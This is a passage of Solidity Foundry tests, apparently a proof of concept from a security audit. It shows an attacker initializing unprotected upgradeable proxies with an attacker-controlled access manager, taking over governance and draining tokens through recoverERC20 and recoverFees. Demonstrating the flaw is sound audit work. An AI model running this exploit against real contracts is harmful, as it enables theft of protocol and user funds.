   Distributor(address(distributorProxy)).initialize(\n            IAccessControlManager(address(attackerACM))\n        );\n\n        DistributionCreator(address(creatorProxy)).initialize(\n            IAccessControlManager(address(attackerACM)),\n            address(distributorProxy),\n            0\n        );\n\n        vm.stopPrank();\n\n        vm.prank(attacker);\n        DistributionCreator(address(creatorProxy)).setFeeRecipient(attacker);\n\n        assertEq(\n            DistributionCreator(address(creatorProxy)).feeRecipient(),\n            attacker,\n            \"Attacker should be fee recipient\"\n        );\n\n        console.log(\"[SUCCESS] Attacker has taken over governance:\");\n        console.log(\"  - Controls accessControlManager\");\n        console.log(\"  - Can set fee recipient\");\n        console.log(\"  - Can modify protocol parameters\");\n        console.log(\"  - Can upgrade contracts (UUPS)\");\n    }\n\n    function testAttackerDrainsDistributorFunds() public {\n        ERC1967Proxy distributorProxy = new ERC1967Proxy(address(distributorImpl), \"\");\n        AttackerAccessControlManager attackerACM = new AttackerAccessControlManager(attacker);\n\n        vm.prank(attacker);\n        Distributor(address(distributorProxy)).initialize(IAccessControlManager(address(attackerACM)));\n\n        MockToken token = new MockToken();\n        uint256 victimFunds = 100 ether;\n        token.mint(address(distributorProxy), victimFunds);\n\n        assertEq(token.balanceOf(address(distributorProxy)), victimFunds);\n        assertEq(token.balanceOf(attacker), 0);\n\n        vm.prank(attacker);\n        Distributor(address(distributorProxy)).recoverERC20(address(token), attacker, victimFunds);\n\n        assertEq(token.balanceOf(address(distributorProxy)), 0, \"Distributor should be drained\");\n        assertEq(token.balanceOf(attacker), victimFunds, \"Attacker should have stolen funds\");\n\n        console.log(\"[SUCCESS] Attacker drained\", victimFunds / 1 ether, \"tokens from Distributor via recoverERC20\");\n    }\n\n    function testAttackerDrainsCreatorFees() public {\n        ERC1967Proxy creatorProxy = new ERC1967Proxy(address(creatorImpl), \"\");\n        ERC1967Proxy distributorProxy = new ERC1967Proxy(address(distributorImpl), \"\");\n        AttackerAccessControlManager attackerACM = new AttackerAccessControlManager(attacker);\n\n        vm.startPrank(attacker);\n        Distributor(address(distributorProxy)).initialize(IAccessControlManager(address(attackerACM)));\n        DistributionCreator(address(creatorProxy)).initialize(\n            IAccessControlManager(address(attackerACM)),\n            address(distributorProxy),\n            0\n        );\n        vm.stopPrank();\n\n        MockToken token = new MockToken();\n        uint256 protocolFees = 50 ether;\n        token.mint(address(creatorProxy), protocolFees);\n\n        assertEq(token.balanceOf(address(creatorProxy)), protocolFees);\n        assertEq(token.balanceOf(attacker), 0);\n\n        IERC20[] memory tokens = new IERC20[](1);\n        tokens[0] = IERC20(address(token));\n\n        vm.prank(attacker);\n        DistributionCreator(address(creatorProxy)).recoverFees(tokens, attacker);\n\n        assertEq(token.balanceOf(address(creatorProxy)), 0, \"DistributionCreator should be drained\");\n        assertEq(token.balanceOf(attacker), protocolFees, \"Attacker should have stolen fees\");\n\n        console.log(\"[SUCCESS] Attacker drained\", protocolFees / 1 ether, \"tokens from DistributionCreator via recoverFees\");\n    }\n}\n```",
